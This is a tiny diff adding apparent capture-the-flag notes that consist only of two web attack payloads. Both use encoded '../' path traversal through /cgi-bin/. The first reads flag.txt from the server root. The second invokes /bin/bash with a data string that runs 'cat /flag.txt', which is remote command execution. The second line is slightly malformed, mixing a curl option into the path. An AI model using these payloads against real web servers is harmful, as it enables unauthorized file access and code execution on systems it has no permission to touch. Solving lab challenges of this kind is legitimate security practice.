@@ -1,0 +1,7 @@
+w/o cgi
+
+/cgi-bin/.%2E/.%2E/.%2E/.%2E/.%2E/.%2E/.%2E/flag.txt
+
+w cgi
+
+/cgi-bin/.%2E/.%2E/.%2E/.%2E/.%2E/.%2E/.%2E/bin/bash -d 'echo; Content-Type : text/plain; echo; cat /flag.txt;'
